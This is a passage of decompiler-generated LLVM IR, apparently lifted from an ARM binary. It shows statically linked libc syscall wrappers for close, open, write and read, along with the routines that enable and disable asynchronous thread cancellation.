bb:                                               ; preds = %entry
  %v2_13d44 = load i32, i32* @r0, align 4
  ret i32 %v2_13d44

bb1:                                              ; preds = %entry
  %v0_13d48 = call i32 @__syscall_error()
  ret i32 %v0_13d48
}

define i32 @__GI___libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13d54 = load i32, i32* @global_var_2469c.515, align 4
  %v2_13d58 = icmp eq i32 %v3_13d54, 0
  store i1 %v2_13d58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13d58, label %dec_label_pc_13d60, label %entry.dec_label_pc_13d7c_crit_edge

entry.dec_label_pc_13d7c_crit_edge:               ; preds = %entry
  %v3_13d7c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_13d7c

dec_label_pc_13d60:                               ; preds = %entry
  %v0_13d60 = load i32, i32* @r7, align 4
  store i32 %v0_13d60, i32* @ip, align 4
  %v0_13d70 = load i32, i32* @r0, align 4
  %v2_13d70 = icmp ugt i32 %v0_13d70, -4097
  %v7_13d70 = icmp eq i32 %v0_13d70, -4096
  store i1 %v7_13d70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13d70, label %bb6, label %bb

bb:                                               ; preds = %bb8, %._crit_edge, %dec_label_pc_13d7c, %dec_label_pc_13d60
  %merge = phi i32 [ %v0_13d70, %dec_label_pc_13d60 ], [ %v0_13da0, %dec_label_pc_13d7c ], [ %.pre, %._crit_edge ], [ %v7_13dc0, %bb8 ]
  ret i32 %merge

bb6:                                              ; preds = %dec_label_pc_13d60
  %v0_13d78 = call i32 @__syscall_error()
  br label %dec_label_pc_13d7c

dec_label_pc_13d7c:                               ; preds = %entry.dec_label_pc_13d7c_crit_edge, %bb6
  %v3_13d7c = phi i32 [ %v3_13d7c.pre, %entry.dec_label_pc_13d7c_crit_edge ], [ %v0_13d78, %bb6 ]
  %v9_13d7c = load i32, i32* @r7, align 4
  store i32 %v9_13d7c, i32* %stack_var_-8, align 4
  %v12_13d7c = load i32, i32* @lr, align 4
  %v0_13d80 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_13d80, i32* @ip, align 4
  store i32 %v3_13d7c, i32* @r7, align 4
  %v1_13d9c = call i32 @__libc_disable_asynccancel(i32 %v0_13d80)
  %v0_13da0 = load i32, i32* @r7, align 4
  store i32 %v0_13da0, i32* @r0, align 4
  %v2_13da4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13da4, i32* @r7, align 4
  store i32 %v12_13d7c, i32* @lr, align 4
  %v2_13da8 = icmp ugt i32 %v0_13da0, -4097
  %v7_13da8 = icmp eq i32 %v0_13da0, -4096
  store i1 %v7_13da8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13da8, label %bb7, label %bb

bb7:                                              ; preds = %dec_label_pc_13d7c
  %v0_13db0 = call i32 @__syscall_error()
  %v1_13dbc = trunc i32 %v0_13db0 to i16
  %v0_13dc0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13dc0, label %bb8, label %._crit_edge

._crit_edge:                                      ; preds = %bb7
  %.pre = sext i16 %v1_13dbc to i32
  br label %bb

bb8:                                              ; preds = %bb7
  %v4_13dc0 = load i32, i32* @r1, align 4
  %v5_13dc0 = inttoptr i32 %v4_13dc0 to i16*
  store i16 %v1_13dbc, i16* %v5_13dc0, align 2
  %v7_13dc0 = sext i16 %v1_13dbc to i32
  %v8_13dc0 = load i32, i32* @r1, align 4
  %v9_13dc0 = sub i32 %v8_13dc0, %v7_13dc0
  store i32 %v9_13dc0, i32* @r1, align 4
  br label %bb

; uselistorder directives
  uselistorder i32 %v7_13dc0, { 1, 0 }
  uselistorder i16 %v1_13dbc, { 1, 2, 0 }
  uselistorder i32 %v0_13da0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_13d70, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13d7c, { 1, 0 }
}

define i32 @__GI___open_nocancel() local_unnamed_addr {
entry:
  %v0_13dd4 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_13dd4, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_13dd4 = load i32, i32* @r0, align 4
  ret i32 %v2_13dd4

bb1:                                              ; preds = %entry
  %v0_13dd8 = call i32 @__syscall_error()
  ret i32 %v0_13dd8
}

define i32 @__libc_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_13de4 = load i32, i32* @global_var_2469c.515, align 4
  %v2_13de8 = icmp eq i32 %v3_13de4, 0
  store i1 %v2_13de8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13de8, label %dec_label_pc_13df0, label %entry.dec_label_pc_13e0c_crit_edge

entry.dec_label_pc_13e0c_crit_edge:               ; preds = %entry
  %v3_13e0c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_13e0c

dec_label_pc_13df0:                               ; preds = %entry
  %v0_13df0 = load i32, i32* @r7, align 4
  store i32 %v0_13df0, i32* @ip, align 4
  %v0_13e00 = load i32, i32* @r0, align 4
  %v2_13e00 = icmp ugt i32 %v0_13e00, -4097
  %v7_13e00 = icmp eq i32 %v0_13e00, -4096
  store i1 %v7_13e00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13e00, label %bb9, label %bb

bb:                                               ; preds = %bb11, %bb10, %dec_label_pc_13e0c, %dec_label_pc_13df0
  %merge = phi i32 [ %v0_13e00, %dec_label_pc_13df0 ], [ %v0_13e30, %dec_label_pc_13e0c ], [ %v0_13e40, %bb10 ], [ %v6_13e50, %bb11 ]
  ret i32 %merge

bb9:                                              ; preds = %dec_label_pc_13df0
  %v0_13e08 = call i32 @__syscall_error()
  br label %dec_label_pc_13e0c

dec_label_pc_13e0c:                               ; preds = %entry.dec_label_pc_13e0c_crit_edge, %bb9
  %v3_13e0c = phi i32 [ %v3_13e0c.pre, %entry.dec_label_pc_13e0c_crit_edge ], [ %v0_13e08, %bb9 ]
  store i32 %v3_13e0c, i32* %stack_var_-24, align 4
  %v9_13e0c = load i32, i32* @r2, align 4
  %v12_13e0c = load i32, i32* @r3, align 4
  %v15_13e0c = load i32, i32* @r7, align 4
  store i32 %v15_13e0c, i32* %stack_var_-8, align 4
  %v18_13e0c = load i32, i32* @lr, align 4
  %v0_13e10 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_13e10, i32* @ip, align 4
  %v2_13e18 = load i32, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %v9_13e0c, i32* @r2, align 4
  store i32 %v12_13e0c, i32* @r3, align 4
  store i32 %v2_13e18, i32* @r7, align 4
  %v1_13e2c = call i32 @__libc_disable_asynccancel(i32 %v0_13e10)
  %v0_13e30 = load i32, i32* @r7, align 4
  store i32 %v0_13e30, i32* @r0, align 4
  %v2_13e34 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13e34, i32* @r7, align 4
  store i32 %v18_13e0c, i32* @lr, align 4
  %v2_13e38 = icmp ugt i32 %v0_13e30, -4097
  %v7_13e38 = icmp eq i32 %v0_13e30, -4096
  store i1 %v7_13e38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13e38, label %bb10, label %bb

bb10:                                             ; preds = %dec_label_pc_13e0c
  %v0_13e40 = call i32 @__syscall_error()
  %v0_13e50 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13e50, label %bb11, label %bb

bb11:                                             ; preds = %bb10
  %v1_13e50 = load i32, i32* @r1, align 4
  %v5_13e50 = udiv i32 %v0_13e40, 65536
  %v6_13e50 = and i32 %v1_13e50, %v5_13e50
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_13e30, { 0, 2, 3, 1 }
  uselistorder i32 %v0_13e00, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13e0c, { 1, 0 }
}

define i32 @__GI___write_nocancel() local_unnamed_addr {
entry:
  %v0_13e64 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_13e64, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_13e64 = load i32, i32* @r0, align 4
  ret i32 %v2_13e64

bb1:                                              ; preds = %entry
  %v0_13e68 = call i32 @__syscall_error()
  ret i32 %v0_13e68
}

define i32 @__GI___libc_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13e74 = load i32, i32* @global_var_2469c.515, align 4
  %v2_13e78 = icmp eq i32 %v3_13e74, 0
  store i1 %v2_13e78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13e78, label %dec_label_pc_13e80, label %entry.dec_label_pc_13e9c_crit_edge

entry.dec_label_pc_13e9c_crit_edge:               ; preds = %entry
  %v3_13e9c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_13e9c

dec_label_pc_13e80:                               ; preds = %entry
  %v0_13e90 = load i32, i32* @r0, align 4
  %v2_13e90 = icmp ugt i32 %v0_13e90, -4097
  %v7_13e90 = icmp eq i32 %v0_13e90, -4096
  store i1 %v7_13e90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13e90, label %bb9, label %bb

bb:                                               ; preds = %dec_label_pc_13e9c, %bb10, %bb11, %dec_label_pc_13e80
  %merge2 = phi i32 [ %v0_13e90, %dec_label_pc_13e80 ], [ %v0_13ec0, %dec_label_pc_13e9c ], [ %v0_13ed0, %bb10 ], [ %v0_13ed0, %bb11 ]
  ret i32 %merge2

bb9:                                              ; preds = %dec_label_pc_13e80
  %v0_13e98 = call i32 @__syscall_error()
  br label %dec_label_pc_13e9c

dec_label_pc_13e9c:                               ; preds = %entry.dec_label_pc_13e9c_crit_edge, %bb9
  %v3_13e9c = phi i32 [ %v3_13e9c.pre, %entry.dec_label_pc_13e9c_crit_edge ], [ %v0_13e98, %bb9 ]
  %v12_13e9c = load i32, i32* @r3, align 4
  %v15_13e9c = load i32, i32* @r7, align 4
  store i32 %v15_13e9c, i32* %stack_var_-8, align 4
  %v18_13e9c = load i32, i32* @lr, align 4
  %v0_13ea0 = call i32 @__libc_enable_asynccancel()
  store i32 %v12_13e9c, i32* @r3, align 4
  store i32 %v3_13e9c, i32* @r7, align 4
  %v1_13ebc = call i32 @__libc_disable_asynccancel(i32 %v0_13ea0)
  %v0_13ec0 = load i32, i32* @r7, align 4
  store i32 %v0_13ec0, i32* @r0, align 4
  %v2_13ec4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13ec4, i32* @r7, align 4
  store i32 %v18_13e9c, i32* @lr, align 4
  %v2_13ec8 = icmp ugt i32 %v0_13ec0, -4097
  %v7_13ec8 = icmp eq i32 %v0_13ec0, -4096
  store i1 %v7_13ec8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13ec8, label %bb10, label %bb

bb10:                                             ; preds = %dec_label_pc_13e9c
  %v0_13ed0 = call i32 @__syscall_error()
  %v0_13ee0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13ee0, label %bb11, label %bb

bb11:                                             ; preds = %bb10
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_13ed0, { 1, 0 }
  uselistorder i32 %v0_13ec0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_13e90, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13e9c, { 1, 0 }
  uselistorder label %bb, { 2, 1, 0, 3 }
}

define i32 @__read_nocancel() local_unnamed_addr {
entry:
  %v0_13ef4 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_13ef4, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_13ef4 = load i32, i32* @r0, align 4
  ret i32 %v2_13ef4

bb1:                                              ; preds = %entry
  %v0_13ef8 = call i32 @__syscall_error()
  ret i32 %v0_13ef8

; uselistorder directives
  uselistorder i1* @cpsr_c, { 1, 2, 3, 4, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13f04 = load i32, i32* @global_var_2469c.515, align 4
  %v2_13f08 = icmp eq i32 %v3_13f04, 0
  br i1 %v2_13f08, label %dec_label_pc_13f10, label %entry.dec_label_pc_13f2c_crit_edge

entry.dec_label_pc_13f2c_crit_edge:               ; preds = %entry
  %v3_13f2c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_13f2c

dec_label_pc_13f10:                               ; preds = %entry
  %v0_13f20 = load i32, i32* @r0, align 4
  %v2_13f20 = icmp ugt i32 %v0_13f20, -4097
  br i1 %v2_13f20, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_13f2c, %dec_label_pc_13f10
  %merge = phi i32 [ %v0_13f20, %dec_label_pc_13f10 ], [ %v0_13f50, %dec_label_pc_13f2c ]
  ret i32 %merge

bb8:                                              ; preds = %dec_label_pc_13f10
  %v0_13f28 = call i32 @__syscall_error()
  br label %dec_label_pc_13f2c

dec_label_pc_13f2c:                               ; preds = %entry.dec_label_pc_13f2c_crit_edge, %bb8
  %v3_13f2c = phi i32 [ %v3_13f2c.pre, %entry.dec_label_pc_13f2c_crit_edge ], [ %v0_13f28, %bb8 ]
  %v6_13f2c = load i32, i32* @r1, align 4
  %v15_13f2c = load i32, i32* @r7, align 4
  store i32 %v15_13f2c, i32* %stack_var_-8, align 4
  %v18_13f2c = load i32, i32* @lr, align 4
  %v0_13f30 = call i32 @__libc_enable_asynccancel()
  store i32 %v6_13f2c, i32* @r1, align 4
  store i32 %v3_13f2c, i32* @r7, align 4
  %v1_13f4c = call i32 @__libc_disable_asynccancel(i32 %v0_13f30)
  %v0_13f50 = load i32, i32* @r7, align 4
  store i32 %v0_13f50, i32* @r0, align 4
  %v2_13f54 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13f54, i32* @r7, align 4
  store i32 %v18_13f2c, i32* @lr, align 4
  %v2_13f58 = icmp ugt i32 %v0_13f50, -4097
  br i1 %v2_13f58, label %bb9, label %bb

bb9:                                              ; preds = %dec_label_pc_13f2c
  %v0_13f60 = call i32 @__syscall_error()
  ret i32 %v0_13f60

; uselistorder directives
  uselistorder i32 %v0_13f50, { 1, 2, 0 }
  uselistorder i32 ()* @__syscall_error, { 3, 2, 11, 7, 6, 10, 1, 0, 9, 5, 4, 8 }
  uselistorder label %dec_label_pc_13f2c, { 1, 0 }
}

define i32 @__libc_disable_asynccancel(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_13f70 = load i32, i32* %r0.global-to-local, align 4
  %v1_13f70 = and i32 %v0_13f70, 2
  %v2_13f70 = icmp eq i32 %v1_13f70, 0
  %v3_13f74 = load i32, i32* @r4, align 4
  store i32 %v3_13f74, i32* %stack_var_-16, align 4
  br i1 %v2_13f70, label %dec_label_pc_13f7c, label %dec_label_pc_13ff0

dec_label_pc_13f7c:                               ; preds = %entry
  %v0_13f7c = call i32 @__aeabi_read_tp()
  store i32 %v0_13f7c, i32* %r0.global-to-local, align 4
  %v1_13f80 = add i32 %v0_13f7c, -1036
  %v2_13f80 = inttoptr i32 %v1_13f80 to i32*
  %v3_13f80 = load i32, i32* %v2_13f80, align 4
  %v1_13f84 = add i32 %v0_13f7c, -1168
  store i32 %v1_13f84, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13f88

dec_label_pc_13f88:                               ; preds = %dec_label_pc_13fbc.dec_label_pc_13f88_crit_edge, %dec_label_pc_13f7c
  %v0_13f94 = phi i32 [ %v0_13f94.pre, %dec_label_pc_13fbc.dec_label_pc_13f88_crit_edge ], [ %v1_13f84, %dec_label_pc_13f7c ]
  %v0_13f88 = phi i32 [ %v0_13fbc, %dec_label_pc_13fbc.dec_label_pc_13f88_crit_edge ], [ %v3_13f80, %dec_label_pc_13f7c ]
  %v1_13f88 = and i32 %v0_13f88, -3
  store i32 %v1_13f88, i32* %r7.global-to-local, align 4
  store i32 %v0_13f88, i32* %r4.global-to-local, align 4
  store i32 %v1_13f88, i32* @r1, align 4
  %v1_13f94 = add i32 %v0_13f94, 132
  store i32 %v1_13f94, i32* @r2, align 4
  %v1_13f9823 = inttoptr i32 %v1_13f94 to i32*
  %v2_13f9824 = load i32, i32* %v1_13f9823, align 4
  %v3_13f9c26 = icmp uge i32 %v2_13f9824, %v0_13f88
  store i1 %v3_13f9c26, i1* %cpsr_c.global-to-local, align 1
  %v9_13f9c32 = icmp eq i32 %v2_13f9824, %v0_13f88
  br i1 %v9_13f9c32, label %dec_label_pc_13fa4, label %dec_label_pc_13fbc

dec_label_pc_13fa4:                               ; preds = %dec_label_pc_13f88, %dec_label_pc_13fa4.dec_label_pc_13f98_crit_edge
  %v0_13fa433 = phi i32 [ %v1_13f9c.pre, %dec_label_pc_13fa4.dec_label_pc_13f98_crit_edge ], [ %v0_13f88, %dec_label_pc_13f88 ]
  store i32 %v0_13fa433, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_13fb4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_13fb4, label %dec_label_pc_13fb8, label %dec_label_pc_13fa4.dec_label_pc_13f98_crit_edge

dec_label_pc_13fa4.dec_label_pc_13f98_crit_edge:  ; preds = %dec_label_pc_13fa4
  %v0_13f98.pre = load i32, i32* @r2, align 4
  %v1_13f9c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_13f98 = inttoptr i32 %v0_13f98.pre to i32*
  %v2_13f98 = load i32, i32* %v1_13f98, align 4
  %v3_13f9c = icmp uge i32 %v2_13f98, %v1_13f9c.pre
  store i1 %v3_13f9c, i1* %cpsr_c.global-to-local, align 1
  %v9_13f9c = icmp eq i32 %v2_13f98, %v1_13f9c.pre
  br i1 %v9_13f9c, label %dec_label_pc_13fa4, label %dec_label_pc_13fbc

dec_label_pc_13fb8:                               ; preds = %dec_label_pc_13fa4
  %v0_13fb8 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13fbc

dec_label_pc_13fbc:                               ; preds = %dec_label_pc_13f88, %dec_label_pc_13fa4.dec_label_pc_13f98_crit_edge, %dec_label_pc_13fb8
  %v0_13fbc = phi i32 [ %v0_13fb8, %dec_label_pc_13fb8 ], [ %v2_13f9824, %dec_label_pc_13f88 ], [ %v2_13f98, %dec_label_pc_13fa4.dec_label_pc_13f98_crit_edge ]
  %v1_13fbc = phi i32 [ %v0_13fb8, %dec_label_pc_13fb8 ], [ %v0_13f88, %dec_label_pc_13f88 ], [ %v1_13f9c.pre, %dec_label_pc_13fa4.dec_label_pc_13f98_crit_edge ]
  %v3_13fbc = icmp uge i32 %v0_13fbc, %v1_13fbc
  store i1 %v3_13fbc, i1* %cpsr_c.global-to-local, align 1
  %v9_13fbc = icmp eq i32 %v0_13fbc, %v1_13fbc
  br i1 %v9_13fbc, label %dec_label_pc_13fe4.preheader, label %dec_label_pc_13fbc.dec_label_pc_13f88_crit_edge

dec_label_pc_13fbc.dec_label_pc_13f88_crit_edge:  ; preds = %dec_label_pc_13fbc
  %v0_13f94.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13f88

dec_label_pc_13fe4.preheader:                     ; preds = %dec_label_pc_13fbc
  %v0_13fe41 = load i32, i32* %r7.global-to-local, align 4
  %v1_13fe42 = and i32 %v0_13fe41, 12
  store i32 %v1_13fe42, i32* @r3, align 4
  %v2_13fe83 = icmp ugt i32 %v1_13fe42, 3
  store i1 %v2_13fe83, i1* %cpsr_c.global-to-local, align 1
  %v7_13fe85 = icmp eq i32 %v1_13fe42, 4
  br i1 %v7_13fe85, label %dec_label_pc_13fc8.lr.ph, label %dec_label_pc_13fe4.preheader.dec_label_pc_13ff0.loopexit_crit_edge

dec_label_pc_13fe4.preheader.dec_label_pc_13ff0.loopexit_crit_edge: ; preds = %dec_label_pc_13fe4.preheader
  %v1_13ff4.pre.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13ff0.loopexit

dec_label_pc_13fc8.lr.ph:                         ; preds = %dec_label_pc_13fe4.preheader
  %v0_13fcc.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_13fcc = add i32 %v0_13fcc.pre, 132
  %v2_13fe0 = inttoptr i32 %v1_13fcc to i32*
  br label %dec_label_pc_13fc8

dec_label_pc_13fc8:                               ; preds = %dec_label_pc_13fc8.lr.ph, %dec_label_pc_13fc8
  %v0_13fc8 = phi i32 [ %v0_13fe41, %dec_label_pc_13fc8.lr.ph ], [ %v3_13fe0, %dec_label_pc_13fc8 ]
  store i32 %v0_13fc8, i32* @r2, align 4
  store i32 %v1_13fcc, i32* %r0.global-to-local, align 4
  store i32 128, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  %v3_13fe0 = load i32, i32* %v2_13fe0, align 4
  store i32 %v3_13fe0, i32* %r7.global-to-local, align 4
  %v1_13fe4 = and i32 %v3_13fe0, 12
  store i32 %v1_13fe4, i32* @r3, align 4
  %v7_13fe8 = icmp eq i32 %v1_13fe4, 4
  br i1 %v7_13fe8, label %dec_label_pc_13fc8, label %dec_label_pc_13fe4.dec_label_pc_13ff0.loopexit_crit_edge

dec_label_pc_13fe4.dec_label_pc_13ff0.loopexit_crit_edge: ; preds = %dec_label_pc_13fc8
  %v2_13fe8 = icmp ugt i32 %v1_13fe4, 3
  store i1 %v2_13fe8, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_13ff0.loopexit

dec_label_pc_13ff0.loopexit:                      ; preds = %dec_label_pc_13fe4.preheader.dec_label_pc_13ff0.loopexit_crit_edge, %dec_label_pc_13fe4.dec_label_pc_13ff0.loopexit_crit_edge
  %v1_13ff4.pre = phi i32 [ %v1_13ff4.pre.pre, %dec_label_pc_13fe4.preheader.dec_label_pc_13ff0.loopexit_crit_edge ], [ %v1_13fcc, %dec_label_pc_13fe4.dec_label_pc_13ff0.loopexit_crit_edge ]
  %v2_13ff0.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_13ff0

dec_label_pc_13ff0:                               ; preds = %dec_label_pc_13ff0.loopexit, %entry
  %v1_13ff4 = phi i32 [ %v1_13ff4.pre, %dec_label_pc_13ff0.loopexit ], [ %v0_13f70, %entry ]
  %v2_13ff0 = phi i32 [ %v2_13ff0.pre, %dec_label_pc_13ff0.loopexit ], [ %v3_13f74, %entry ]
  store i32 %v2_13ff0, i32* @r4, align 4
  ret i32 %v1_13ff4

; uselistorder directives
  uselistorder i32 %v3_13fe0, { 1, 2, 0 }
  uselistorder i32 %v1_13fcc, { 0, 2, 1 }
  uselistorder i32 %v0_13fb8, { 1, 0 }
  uselistorder i32 %v1_13f9c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_13f88, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 3, 5, 4, 2 }
  uselistorder label %dec_label_pc_13ff0.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_13fc8, { 1, 0 }
  uselistorder label %dec_label_pc_13fbc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13fa4, { 1, 0 }
}

define i32 @__libc_enable_asynccancel() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_13ff8 = load i32, i32* @r4, align 4
  store i32 %v3_13ff8, i32* %stack_var_-24, align 4
  store i32 54436, i32* %r8.global-to-local, align 4
  %v0_14000 = call i32 @__aeabi_read_tp()
  %v1_14004 = add i32 %v0_14000, -1036
  %v2_14004 = inttoptr i32 %v1_14004 to i32*
  %v3_14004 = load i32, i32* %v2_14004, align 4
  store i32 %v3_14004, i32* %r6.global-to-local, align 4
  %v1_14008 = add i32 %v0_14000, -1168
  store i32 %v1_14008, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* %r8.global-to-local, align 4
  %v1_1401046 = or i32 %v3_14004, 2
  store i32 %v1_1401046, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1401449 = icmp eq i32 %v1_1401046, %v3_14004
  br i1 %v9_1401449, label %dec_label_pc_140c0, label %dec_label_pc_1401c

dec_label_pc_1401c:                               ; preds = %entry, %bb.dec_label_pc_1401c_crit_edge
  %v0_14020 = phi i32 [ %v0_14020.pre, %bb.dec_label_pc_1401c_crit_edge ], [ %v1_14008, %entry ]
  %v1_1401051 = phi i32 [ %v1_14010, %bb.dec_label_pc_1401c_crit_edge ], [ %v1_1401046, %entry ]
  %v0_1402450 = phi i32 [ %v1_14050, %bb.dec_label_pc_1401c_crit_edge ], [ %v3_14004, %entry ]
  store i32 %v1_1401051, i32* @r1, align 4
  %v1_14020 = add i32 %v0_14020, 132
  store i32 %v1_14020, i32* @r2, align 4
  store i32 %v0_1402450, i32* %r4.global-to-local, align 4
  %v1_1402834 = inttoptr i32 %v1_14020 to i32*
  %v2_1402835 = load i32, i32* %v1_1402834, align 4
  store i32 %v2_1402835, i32* @r3, align 4
  %v3_1402c37 = icmp uge i32 %v2_1402835, %v0_1402450
  store i1 %v3_1402c37, i1* %cpsr_c.global-to-local, align 1
  %v9_1402c43 = icmp eq i32 %v2_1402835, %v0_1402450
  br i1 %v9_1402c43, label %dec_label_pc_14034, label %dec_label_pc_1404c

dec_label_pc_14034:                               ; preds = %dec_label_pc_1401c, %dec_label_pc_14034.dec_label_pc_14028_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_14044 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14044, label %dec_label_pc_14048, label %dec_label_pc_14034.dec_label_pc_14028_crit_edge

dec_label_pc_14034.dec_label_pc_14028_crit_edge:  ; preds = %dec_label_pc_14034
  %v0_14028.pre = load i32, i32* @r2, align 4
  %v1_1402c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14028 = inttoptr i32 %v0_14028.pre to i32*
  %v2_14028 = load i32, i32* %v1_14028, align 4
  store i32 %v2_14028, i32* @r3, align 4
  %v3_1402c = icmp uge i32 %v2_14028, %v1_1402c.pre
  store i1 %v3_1402c, i1* %cpsr_c.global-to-local, align 1
  %v9_1402c = icmp eq i32 %v2_14028, %v1_1402c.pre
  br i1 %v9_1402c, label %dec_label_pc_14034, label %dec_label_pc_1404c

dec_label_pc_14048:                               ; preds = %dec_label_pc_14034
  %v0_14048 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14048, i32* @r3, align 4
  br label %dec_label_pc_1404c

dec_label_pc_1404c:                               ; preds = %dec_label_pc_1401c, %dec_label_pc_14034.dec_label_pc_14028_crit_edge, %dec_label_pc_14048
  %v1_14050 = phi i32 [ %v0_14048, %dec_label_pc_14048 ], [ %v2_1402835, %dec_label_pc_1401c ], [ %v2_14028, %dec_label_pc_14034.dec_label_pc_14028_crit_edge ]
  %v1_1404c = load i32, i32* %r6.global-to-local, align 4
  %v3_1404c = icmp uge i32 %v1_14050, %v1_1404c
  store i1 %v3_1404c, i1* %cpsr_c.global-to-local, align 1
  %v9_1404c = icmp eq i32 %v1_14050, %v1_1404c
  br i1 %v9_1404c, label %dec_label_pc_14058, label %bb

bb:                                               ; preds = %dec_label_pc_1404c
  store i32 %v1_14050, i32* %r6.global-to-local, align 4
  %v1_14010 = or i32 %v1_14050, 2
  store i32 %v1_14010, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_14014 = icmp eq i32 %v1_14010, %v1_14050
  br i1 %v9_14014, label %dec_label_pc_140c0, label %bb.dec_label_pc_1401c_crit_edge

bb.dec_label_pc_1401c_crit_edge:                  ; preds = %bb
  %v0_14020.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1401c

dec_label_pc_14058:                               ; preds = %dec_label_pc_1404c
  %v0_14058 = load i32, i32* %r5.global-to-local, align 4
  %v1_14058 = and i32 %v0_14058, -69
  store i32 %v1_14058, i32* @r3, align 4
  %v2_1405c = icmp ugt i32 %v1_14058, 9
  store i1 %v2_1405c, i1* %cpsr_c.global-to-local, align 1
  %v7_1405c = icmp eq i32 %v1_14058, 10
  br i1 %v7_1405c, label %dec_label_pc_14064, label %dec_label_pc_140c0

dec_label_pc_14064:                               ; preds = %dec_label_pc_14058
  %v1_14068 = load i32, i32* %r7.global-to-local, align 4
  %v2_14068 = add i32 %v1_14068, 544
  %v3_14068 = inttoptr i32 %v2_14068 to i32*
  store i32 -1, i32* %v3_14068, align 4
  %v0_1406c = load i32, i32* @r2, align 4
  store i32 %v0_1406c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14070

dec_label_pc_14070:                               ; preds = %dec_label_pc_140a4.dec_label_pc_14070_crit_edge, %dec_label_pc_14064
